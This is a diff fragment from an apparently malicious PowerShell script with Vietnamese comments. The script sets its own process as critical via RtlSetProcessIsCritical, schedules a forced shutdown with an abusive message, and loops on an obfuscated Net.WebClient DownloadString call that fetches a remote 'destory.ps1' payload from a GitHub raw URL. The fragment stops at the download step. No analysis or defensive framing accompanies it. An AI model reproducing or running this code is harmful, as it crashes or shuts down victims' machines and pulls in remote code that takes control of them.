@@ -15,7 +15,7 @@ Add-Type -TypeDefinition $code
 # Đánh dấu process là Critical
 [CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
 [console]::Beep(4000, 100)   # Tần số 4000Hz, kéo dài 100ms
-shutdown /s /t 60 /c "Fuck you!!!"
+shutdown /s /t 120 /c "Fuck you!!!"
 while ($true) {
     $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
